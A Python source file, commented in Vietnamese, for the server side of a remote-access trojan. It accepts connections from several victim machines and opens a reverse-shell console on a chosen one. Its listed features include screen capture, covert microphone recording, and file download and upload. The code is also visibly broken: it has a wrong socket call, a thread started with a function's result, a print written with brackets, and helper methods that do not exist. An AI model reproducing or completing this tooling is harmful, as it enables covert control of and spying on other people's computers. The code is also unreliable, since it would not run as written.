import socket , subprocess , re , os 
import tabulate # để in ra ở định dạng bảng 
import tqdm # để hiển thị thanh tiến trình khi down hoặc upload file 
from threading import Thread

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1440 # độ dài tối đa của một message 
SEPERATOR  = "<sep>"

class Server: 
    def __init__(self, host, port):
        self.host = host
        self.port = port 
        self.server_socket = socket.get_server_socket() 
        self.clients = {}
        # một dict để mapping giữa mỗi client với thư mục hiện tại của nó 
        self.clients_cwd = {} 
        # người dùng hiện tại của server 
        self.current_client = None
    def get_server_socket(self , custom_port = None) :
        s = socket.socket() 
        # nếu custom_port được cung cấp , sử dụng nó , nếu khồng dùng self.port 
        if custom_port :
            port = custom_port
        else:
            port = self.port
        s.bind((self.host , port))
        s.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR , 1)
        s.listen(5)
        print(f"[*] Listening as {self.host}:{port}")
        return s
    def accept_connection(self) : # chấp nhận kết nối từ client 
        while True :
            try :  
                client_socket , client_address = self.server_socket.accept()
            except OSError :
                print(f"[-] Server socket closed , exiting....")
            print(f"[+] {client_address[0]} : {client_address[1]} connected")
            # Nhận thư mục hiện tại của client 
            cwd = client_socket.recv(BUFFER_SIZE).decode()
            print(f"[+] Current working directory : {cwd}")
            # thêm client vào dicts 
            self.clients[client_address] = client_socket # theo format : {client_address : client_socket}
            self.clients_cwd[client_address] = cwd
    # hàm chạy trong một luồng riêng biệt để nhận các kết nối từ client
    def accept_connections (self) :
        # bắt đầu một luồng tách biệt để chấp nhận các kết nối từ client
        self.connection_thread = Thread(target=self.accept_connection())
        # thiết lập daemon cho luồng kết nối để nó sẽ tự động kết thúc khi chương trình chính kết thúc
        self.connection_thread.daemon = True
        self.connection_thread.start()
    # hàm đóng tất cả kết nối 
    def close_connections(self) :
        for _, client_socket in self.clients.items() :
            client_socket.close()
        self.server_socket.close()
    # tạo một hàm chịu trach nhiệm interpreter các lệnh từ client 
    def start_interpreter(self) : 
        while True : 
            command = input ("[*] interpreter $ > ") 
            if re.search(r"help\w*" , command) : # sử dụng regex để kiểm tra xem người dùng có nhập help hay không - phải bắt đầu bằng help và có thể có thêm ký tự sau help
                # nếu như người dùng nhập help hoặc help <command>
                print ("[*] Interpreter usage :") 
                # tạo một bảng bằng tabulate để in ra các lệnh và cách sử dụng
                print (tabulate.tabulate([["Command" , "Usage"] , 
                                          ["help" , "Print this help messages"] , 
                                          ["list" , "List all connected users"] ,
                                          ["use [machine_index]" , "Start reverse shell on the specified client , eg  'use 1' will start the reverse shell on the second connected machine , and 0 is the first one."]])) 
                print("="*30 , "Custom commands inside the reverse shell" , "="*30)
                print(tabulate.tabulate([["Command" , "Usage"] , 
                                         ["abort" , "Remove the client from the connected clients list"], 
                                         ["exit|quit" , "Get back to interpreter without removing the client"] , 
                                         ["screenshot [path_to_image].png" , "Take a screenshot of the main screen and save it as an image file"] , 
                                         ["recordmic [path_to_audio].wav [number_of_seconds]" , "Record the default microphone for number of seconds and save it as an audio file in the specified path . An simple is `recordmic test.wav 5` will record for 5 seconds and save to test.wav in the current directory"], 
                                         ["download [path_to_file]" , "Download the specified file from the clien client"] ,
                                         ["upload [path_to_file]" , "Upload the specified file from your local machine to the client"]]))
            elif re.search(r"list\w*" , command) :
                # list tất cả client connected 
                connected_clients = [] 
                for index , ((client_host , client_port) , cwd) in enumerate(self.clients_cwd.items()) :  # hàm enumerate trả về index và giá trị của mỗi phần tử trong dict
                    connected_clients.append([index , client_host , client_port , cwd])
                # in ra những client connected ở dạng bảng 
                print(tabulate.tabulate(connected_clients , headers=["Index" , "Address" , "Port" , "CWD"])) # headers là tên của các cột
            elif (match := re.search(r"use\s*(\w*)" , command)) : 
                # sử dụng regex để tìm user 
                # \s* để bỏ qua khoảng trắng - \w* là bất kỳ ký tự nào
                # nếu người dùng muốn sử dụng một client cụ thể 
                # lấy index của client 
                try : 
                    client_index = int(match.group(1))
                except ValueError :
                    # Không có chữ số sau lệnh muốn sử dụng 
                    print (f"[-] Please insert the index of the client , a number")
                    continue
                else : 
                    try :
                        self.current_client = list(self.clients)[client_index] 
                    except IndexError :
                        print[f"[-] Please insert a valid index , maximum is {len(self.clients)}"]
                        continue
                    else : 
                        # bắt đầu reverse shell trên client đã chọn 
                        self.start_reverse_shell() 
            elif command.lower() in ["exit" , "quit"] :
                # thoát khỏi chương trình 
                break
            elif command == "" :
                pass 
            else :
                print("[-] Invalid command" , command)
        self.close_connections()
    def start(self) :
        # phương thức khởi động máy chủ . Chấp nhận kết nối từ client và khởi động phiên dịch chính 
        self.accept_connections()
        self.start_interpreter()
    def start_reverse_shell(self) :
        # lấy ra thư mục hiện tại của client đang chọn 
         cwd = self.clients_cwd[self.current_client]
         client_socket = self.clients[self.current_client]
         while True : 
             # lấy lệnh từ người dùng 
             command = input(f"{cwd} $ > ")
             if not command.strip() : 
                 # empty command 
                 continue
             # xử lý các lệnh local - tức là thực thi trên server chứ không phải ở client 
             if (match := re.search(r"local\s*(.*)" , command)) : 
                 local_command = match.group(1)
                 if (cd_match := re.search(r"cd\s*(.*)" , local_command)) : 
                     # nếu nó là câu lệnh cd , thay đổi thư mục thay vì thực thi lệnh 
                     cd_path = cd_match.group(1)
                     if cd_path : 
                         os.chdir(cd_path)
                 else : # nếu không phải là cd thì thực thi lệnh bình thường
                     local_output = subprocess.getoutput(local_command)
                     print(local_output)
                 # nếu đó là lệnh cục bộ thì không gửi đến máy khách 
                 continue 
                # gửi lệnh đến client
             client_socket.send(command.encode()) 
             if command.lower() in ["exit" , "quit"] :
                 break
             elif command.lower() == "abort" : 
                 # xóa client khỏi danh sách client 
                 del self.clients[self.current_client]
                 del self.clients_cwd[self.current_client]
                 break
            # chức năng download và upload 
             elif (match := re.search(r"download\s*(.*)" , command)) :
                 # nhận file từ client 
                 self.receive_file() 
             elif (match := re.search(r"upload\s*(.*) " , command)) : 
                 # gửi file đến client 
                 filename = match.group(1)
                 if not os.path.isfile(filename) : # nếu file không tồn tại 
                    print(f"[-] File {filename} does not exist")
                 else : 
                     self.send_file(filename)
                # nhận output từ client
             output = client_socket.recv(BUFFER_SIZE).decode()
             results , cwd = output.split(SEPERATOR)
             self.clients_cwd[self.current_client] = cwd # cập nhật cwd vì nó có thể đã thay đổi
             print(results)
         self.current_client = None
    def receive_all_data (self , socket , buffer_size) :
        # hàm này chỉ đơn giản là nhận dữ liệu từ socket cho đến khi không còn dữ liệu nào nữa
        data = b""
        while True :
            output = socket.recv(buffer_size)
            data += output
            if not output or len(output) < buffer_size :
                break  
        return data 
    # hàm nhận file 
    def receive_file (self , port = 5002) :
        # tạo một server socket khác với port được cung cấp 
        # mục đích là không làm gián đọan luồng chính của server 
        # khi server xử lý nhiều kết nối , việc truyền file trên cùng một socket với shell command có thể gây lỗi hoặc chặm 
        s = self.get_server_socket(custom_port=port)
        # chấp nhận kết nối từ client
        client_socket , client_address = s.accept()
        print(f"[+] {client_address} connected")
        Server._receive_file(client_socket) # gọi phương thức tĩnh  
    def send_file (self , filename , port=5002) : 
        s = self.get_server_socket(custom_port=port)
        client_socket , client_address = s.accept()
        print(f"[+] {client_address} connected")
        Server._send_file(client_socket , filename) 